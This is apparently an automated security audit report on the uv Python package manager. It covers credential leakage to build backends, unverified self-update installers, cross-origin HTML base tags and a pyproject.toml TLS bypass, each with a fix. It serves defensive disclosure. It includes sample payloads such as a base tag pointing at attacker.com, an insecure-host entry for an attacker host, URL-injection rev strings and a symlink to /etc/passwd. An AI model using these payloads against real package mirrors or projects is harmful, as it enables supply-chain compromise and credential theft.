# Security Audit Report: uv Python Package Manager

**Target:** uv (Astral's Python package and project manager)  
**Repository:** https://github.com/astral-sh/uv  
**Audited Commit:** `da5f6a6967b41423fb2a61bf094adff4e403367c`  
**Audit Date:** 2026-05-28  
**Auditor:** AutoFyn Security Audit Team

---

## Executive Summary

This audit identified five independently verified vulnerabilities in uv, plus two defense-in-depth
gaps. The most critical findings are: (1) build backends inherit the full parent process
environment, allowing malicious packages to exfiltrate sensitive credentials; (2) `uv self update`
downloads and executes a shell installer from `UV_ASTRAL_MIRROR_URL` without any hash or signature
verification, enabling RCE for anyone who controls the mirror URL; and (3) `allow-insecure-host` can
be set in `pyproject.toml` (unlike proxy settings), allowing checked-in configs to silently disable
TLS verification.

---

## Vulnerability Summary

| Severity | ID          | Title                                         | Status                  |
| -------- | ----------- | --------------------------------------------- | ----------------------- |
| **HIGH** | UV-2026-001 | Credential Leakage via Build Backends         | VERIFIED                |
| **HIGH** | UV-2026-005 | Self-Update Installer Script Injection        | VERIFIED                |
| **HIGH** | UV-2026-006 | HTML Base Tag Injection                       | VERIFIED                |
| **HIGH** | UV-2026-007 | pyproject.toml allow-insecure-host TLS Bypass | VERIFIED                |
| MEDIUM   | UV-2026-002 | GitHub API URL Injection                      | VERIFIED                |
| LOW      | UV-2026-003 | Symlink Escape in .data/scripts               | Defense-in-depth gap    |
| INFO     | UV-2026-004 | RECORD Hash Not Validated                     | By design (matches pip) |

---

## Detailed Findings

### UV-2026-001: Credential Leakage via Build Backends (HIGH)

**Location:** `crates/uv-build-frontend/src/lib.rs:1203-1222`

**Description:**  
When uv invokes a build backend (e.g., setuptools, hatchling) to build a source distribution, the
subprocess inherits the full parent process environment. Only four environment variables are
explicitly removed:

- `PYX_API_KEY`
- `UV_API_KEY`
- `PYX_AUTH_TOKEN`
- `UV_AUTH_TOKEN`

All other environment variables are passed to the build backend, including:

- `AWS_SECRET_ACCESS_KEY`, `AWS_ACCESS_KEY_ID`, `AWS_SESSION_TOKEN`
- `GITHUB_TOKEN`, `GH_TOKEN`, `GIT_TOKEN`
- `HF_TOKEN` (Hugging Face)
- `UV_PUBLISH_TOKEN`, `UV_PUBLISH_PASSWORD`
- `UV_INDEX_{name}_USERNAME`, `UV_INDEX_{name}_PASSWORD`
- Any other secrets present in the shell environment

**Impact:**  
A malicious package's setup.py or build backend can read and exfiltrate these credentials. This is a
supply-chain attack vector: installing a single malicious package (even as a transitive dependency)
compromises all secrets in the user's environment.

**Root Cause:**

```rust
// lib.rs:1203-1218
let mut command = Command::new(venv.python_executable());
// ... environment inherited by default ...
for key in ["PYX_API_KEY", "UV_API_KEY", "PYX_AUTH_TOKEN", "UV_AUTH_TOKEN"] {
    command.env_remove(key);
}
```

The code removes only 4 specific variables instead of using an allowlist approach.

**Reproduction:**

```bash
bash autofyn_audit/exploits/01_credential_leakage/run_exploit.sh
```

**Verified:** PASS. The exploit successfully captured `AWS_SECRET_ACCESS_KEY` and `HF_TOKEN` while
confirming `UV_API_KEY` was correctly stripped.

**Recommendation:**

1. Consider clearing the environment and using an explicit allowlist of safe variables (PATH, HOME,
   LANG, etc.)
2. Alternatively, document this behavior prominently so users understand the risk of installing
   untrusted packages
3. Consider adding a `--sandbox-build` flag that runs builds in a restricted environment

---

### UV-2026-002: GitHub API URL Injection (MEDIUM)

**Location:** `crates/uv-git/src/resolver.rs:101-105`

**Description:**  
When resolving Git dependencies, uv uses a GitHub API fast-path to resolve commit SHAs without
cloning. The `rev` (branch/tag/ref) is interpolated directly into the API URL without
percent-encoding:

```rust
// resolver.rs:105
let github_api_url = format!("{github_api_base_url}/{owner}/{repo}/commits/{rev}");
```

A rev containing `?` (e.g., `main?injected=param`) or `/` (e.g., `../../../admin`) is inserted
literally into the URL, causing:

- Query parameter injection: `main?foo=bar` becomes `...commits/main?foo=bar`
- Path manipulation: `../../../x` could traverse the API path

**Impact:**  
Limited. The response must parse as a 40-character hex SHA (`GitOid::from_str` validation at line
136), so no actual data exfiltration is possible. However:

- Unexpected API endpoints may be hit
- Rate limiting behavior may be affected
- Internal GitHub Enterprise deployments (via `UV_GITHUB_FAST_PATH_URL`) may have different behavior

**Root Cause:**  
The codebase has `as_url_rev()` which correctly percent-encodes the rev, but `resolver.rs` calls
`as_rev()` instead.

**Reproduction:**

```bash
bash autofyn_audit/exploits/02_github_url_injection/run_exploit.sh
```

**Verified:** PASS. Mock server captured request path `/astral-sh/ruff/commits/main?injected=param`
with unencoded query string.

**Recommendation:**  
Replace `as_rev()` with `as_url_rev()` at `resolver.rs:105`.

---

### UV-2026-005: Self-Update Installer Script Injection (HIGH)

**Location:** `crates/uv/src/commands/self_update.rs:340-395` (`run_official_updater`)

**Description:** `uv self update` downloads a shell installer (`uv-installer.sh`) from
`UV_ASTRAL_MIRROR_URL` and executes it directly without any hash or signature verification. The
download URL is constructed as:

```
{UV_ASTRAL_MIRROR_URL}/github/uv/releases/download/{version}/uv-installer.sh
```

Any party who controls `UV_ASTRAL_MIRROR_URL` — including a compromised corporate Nexus/Artifactory
mirror, a CI environment variable, or a network MITM on a non-TLS mirror — can deliver an arbitrary
shell script that executes as the user running `uv self update`.

**Attack Vector:** An attacker sets (or intercepts) `UV_ASTRAL_MIRROR_URL` to point at a server they
control. They also need `UV_INSECURE_HOST` to allow self-signed certs, or they use a compromised CA.
When the victim runs `uv self update`, uv fetches the malicious installer and executes it — with no
integrity check.

**Root Cause:**

```rust
// self_update.rs:359-365
download_installer_from_urls(
    &installer_urls,
    &installer_path,
    client_builder,
    github_token,
)
.await?;
// Then immediately executed with no hash check:
execute_official_installer(&installer_path, ...).await?;
```

There is no SHA256, SHA512, or GPG verification between download and execution.

**Impact:** HIGH. Full RCE as the invoking user on any machine where `UV_ASTRAL_MIRROR_URL` is
attacker-controlled. In enterprise environments where a mirror is shared across many CI runners and
developer workstations, a single mirror compromise results in mass code execution.

**CVSS:** AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (Score: 7.5)

**Reproduction:**

```bash
bash autofyn_audit/exploits/03_self_update_injection/run_exploit.sh
```

**Verified:** PASS. The malicious installer was fetched from the mock HTTPS server and executed,
writing `/tmp/exploit_03_marker.txt` to prove RCE.

**Recommendation:**

1. Publish a detached GPG signature or SHA256 checksum alongside each `uv-installer.sh` and verify
   it before execution.
2. Alternatively, publish the installer inline as a GitHub release asset and verify via the GitHub
   API `assets[].digest` field.
3. As a defense-in-depth measure, display the installer hash to the user before execution when
   `UV_ASTRAL_MIRROR_URL` overrides the default mirror.

---

### UV-2026-006: HTML Base Tag Injection (HIGH)

**Location:** `crates/uv-client/src/html.rs:170-176`

**Description:** The PEP 503 simple index HTML parser in uv honours the `<base href="...">` tag from
the server response and uses it to resolve all relative package links — without validating that the
base URL is same-origin as the index URL.

An attacker who controls any PyPI mirror can embed a cross-origin
`<base href="http://attacker.com/">` tag in the simple index page. All relative package file links
are then resolved against the attacker URL, causing uv to download packages from the
attacker-controlled server.

**Root Cause:**

```rust
// html.rs:170-176
fn parse_base(base: &HTMLTag) -> Result<Option<DisplaySafeUrl>, Error> {
    let Some(href) = attribute(base, "href") else {
        return Ok(None);
    };
    // Accepts ANY absolute URL — no same-origin check.
    let url = DisplaySafeUrl::parse(&href)
        .map_err(|err| Error::UrlParse(href.to_string(), err))?;
    Ok(Some(url))
}
```

`FileLocation::new()` in `crates/uv-distribution-types/src/file.rs:139-143` then joins relative
hrefs against this attacker-controlled base URL to produce the final download URL.

**Impact:** An attacker controlling a PyPI mirror (e.g., a corporate Nexus/Artifactory instance, a
DNS-hijacked mirror, or a compromised index) can serve a simple-index page that redirects all
package downloads to a server they control. The attacker can serve malicious packages without
modifying any package metadata or hashes in the index itself.

**Reproduction:**

```bash
bash autofyn_audit/exploits/05_base_tag_injection/run_exploit.sh
```

**Verified:** PASS. Attacker server at port 18082 received `GET /requests-2.32.0.tar.gz` after mock
PyPI at port 18081 returned a simple-index page with `<base href="http://localhost:18082/">`.

**Recommendation:**

1. In `parse_base()`, validate that the parsed base URL's origin (scheme + host + port) matches the
   origin of the index URL. Reject or warn on cross-origin base tags.
2. Alternatively, strip or ignore `<base>` tags entirely from PEP 503 responses, since the spec does
   not require them and they introduce unnecessary attack surface.

---

### UV-2026-007: pyproject.toml allow-insecure-host TLS Bypass (HIGH)

**Location:** `crates/uv-settings/src/settings.rs:420-435`

**Description:** The `allow-insecure-host` setting, which disables TLS certificate verification for
specified hosts, can be declared in `pyproject.toml` under `[tool.uv]`. Unlike proxy settings
(`http-proxy`, `https-proxy`, `no-proxy`), which are restricted to `uv.toml` via the `uv_toml_only`
annotation, `allow-insecure-host` has no such restriction.

A malicious or compromised `pyproject.toml` checked into a repository can silently grant TLS bypass
for any host. A developer who clones the repository and runs `uv pip install` will connect to
attacker-controlled HTTPS endpoints with certificate verification disabled — with no CLI flag and no
visible warning.

**Root Cause:**

```toml
# pyproject.toml — any project file can contain this
[tool.uv]
allow-insecure-host = ["attacker.example.com:443"]
```

```rust
// settings.rs:344-360 — workspace config is loaded alongside CLI args
let allow_insecure_host = args.allow_insecure_host
    ...
    .chain(
        workspace
            .and_then(|workspace| workspace.globals.allow_insecure_host.clone())
            .into_iter()
            .flatten(),
    )
    .collect();
```

Compare: `no-proxy` at `settings.rs:410-418` carries `uv_toml_only = true`, preventing it from being
set in `pyproject.toml`. `allow-insecure-host` lacks this guard.

**Impact:** Supply-chain attack: an attacker introduces a `pyproject.toml` change (e.g., via a
compromised dependency, a malicious PR, or a subtly altered fork) that adds `allow-insecure-host`
for a host they control. All developers and CI pipelines that use that project will silently bypass
TLS verification when downloading packages, enabling MITM attacks.

**Reproduction:**

```bash
bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh
```

**Verified:** PASS. uv connected to an HTTPS server with a self-signed certificate (not in the
system trust store) when run inside a project whose `pyproject.toml` contained
`allow-insecure-host = ["localhost:8447"]`. No `--allow-insecure-host` CLI flag was passed.

**Recommendation:**

1. Add `uv_toml_only = true` to `allow-insecure-host` in `settings.rs`, preventing it from being set
   in `pyproject.toml`. Users who need this setting should configure it in `uv.toml` or via the
   CLI/environment variable `UV_INSECURE_HOST`.
2. Emit a warning when `allow-insecure-host` is loaded from `pyproject.toml` rather than `uv.toml`.
3. Consider adding it to the list of security-sensitive settings that are masked in debug output (it
   is already partially handled in `lib.rs:507-508`).

---

### UV-2026-003: Symlink Escape in .data/scripts (LOW)

**Location:** `crates/uv-install-wheel/src/wheel.rs:453-467`

**Description:**  
When installing wheel scripts from `.data/scripts/`, uv validates that symlinks point to files (not
directories) and are not broken. However, it does not check whether the symlink target is within the
virtual environment boundary. A symlink like `.data/scripts/evil -> /etc/passwd` would pass
validation and be installed to the venv's `bin/` directory.

**Impact:**  
Limited. This is NOT directly exploitable via wheel installation because:

- ZIP extraction writes symlink entries as regular text files containing the target path
- The symlink mode bits (`0o120000`) are not interpreted during extraction

This vulnerability is only exploitable via direct manipulation of uv's wheel cache. An attacker with
local filesystem access could create actual symlinks in the cache and trigger reinstallation.

**Threat Model:**  
If an attacker has write access to uv's cache directory, they can do far worse than symlink attacks
(e.g., replace any cached wheel with malicious code). This is a defense-in-depth gap, not a
practical attack vector.

**Recommendation:**  
After `canonicalize()` at line 454, add a check: `target.starts_with(venv_base)`.

---

### UV-2026-004: RECORD Hash Not Validated (INFO)

**Location:** `crates/uv-install-wheel/src/wheel.rs:955-956`

**Description:**  
The RECORD file in wheels contains SHA256 hashes for each file. uv's `validate_and_heal_record()`
only checks file presence by path; the actual hashes are not verified.

**Impact:**  
None in practice. ZIP CRC32 is validated during extraction. This matches pip's behavior.

**Recommendation:**  
None required. This is consistent with the Python packaging ecosystem.

---

## Reproduction Instructions

### Prerequisites

- Docker (for reproducible environment)
- OR: uv installed locally

### Using Docker (Recommended)

```bash
cd autofyn_audit
docker build -t uv-audit .
docker run --rm uv-audit bash /audit/autofyn_audit/scripts/run_all_exploits.sh
```

### Using Local uv

```bash
# From repository root
bash autofyn_audit/scripts/run_all_exploits.sh
```

### Individual Exploits

```bash
# Exploit 1: Credential Leakage
bash autofyn_audit/exploits/01_credential_leakage/run_exploit.sh

# Exploit 2: GitHub API URL Injection
bash autofyn_audit/exploits/02_github_url_injection/run_exploit.sh

# Exploit 3: Self-Update Installer Script Injection
bash autofyn_audit/exploits/03_self_update_injection/run_exploit.sh

# Exploit 4: HTML Base Tag Injection
bash autofyn_audit/exploits/05_base_tag_injection/run_exploit.sh

# Exploit 5: pyproject.toml allow-insecure-host TLS Bypass
bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh
```

---

## Test Environment

- **Base Image:**
  `python:3.12-slim@sha256:090ba77e2958f6af52a5341f788b50b032dd4ca28377d2893dcf1ecbdfdfe203`
- **Rust Toolchain:** stable (as of audit date)
- **uv Commit:** `da5f6a6967b41423fb2a61bf094adff4e403367c`
- **uv Version:** 0.11.13 (or built from source)

---

## Disclosure Timeline

| Date       | Action                                   |
| ---------- | ---------------------------------------- |
| 2026-05-28 | Audit completed                          |
| TBD        | Report delivered to Astral security team |
| TBD        | Fix released                             |
| TBD        | Public disclosure                        |

---

## Appendix: Code References

### UV-2026-001 (Credential Leakage)

- `crates/uv-build-frontend/src/lib.rs:1203` — Command::new() inherits parent env
- `crates/uv-build-frontend/src/lib.rs:1214-1218` — Only 4 vars removed via env_remove()

### UV-2026-002 (URL Injection)

- `crates/uv-git/src/resolver.rs:101-105` — format!() with raw rev
- `crates/uv-git-types/src/reference.rs:60` — as_rev() returns unencoded string
- `crates/uv-git-types/src/reference.rs:66` — as_url_rev() exists but unused

### UV-2026-003 (Symlink Escape)

- `crates/uv-install-wheel/src/wheel.rs:453-467` — symlink validation missing boundary check
- `crates/uv-extract/src/sync.rs:87` — File::create() used, not symlink creation

### UV-2026-004 (RECORD Hash)

- `crates/uv-install-wheel/src/wheel.rs:955-956` — Comment: "We don't heal the hash"

### UV-2026-005 (Self-Update Injection)

- `crates/uv/src/commands/self_update.rs:340-395` — `run_official_updater()` downloads and executes
  installer
- `crates/uv/src/commands/self_update.rs:359-365` — `download_installer_from_urls()` with no hash
  verification
- `crates/uv/src/commands/self_update.rs:367-374` — `execute_official_installer()` immediately after
  download

### UV-2026-006 (HTML Base Tag Injection)

- `crates/uv-client/src/html.rs:170-176` — `parse_base()` accepts any URL, no same-origin check
- `crates/uv-distribution-types/src/file.rs:139-143` — `FileLocation::new()` joins relative URLs
  against attacker-controlled base

### UV-2026-007 (pyproject.toml allow-insecure-host)

- `crates/uv-settings/src/settings.rs:420-435` — `allow-insecure-host` lacks `uv_toml_only`
- `crates/uv-settings/src/settings.rs:410-418` — `no-proxy` has `uv_toml_only = true` (contrast)
- `crates/uv/src/settings.rs:344-360` — workspace globals loaded alongside CLI args
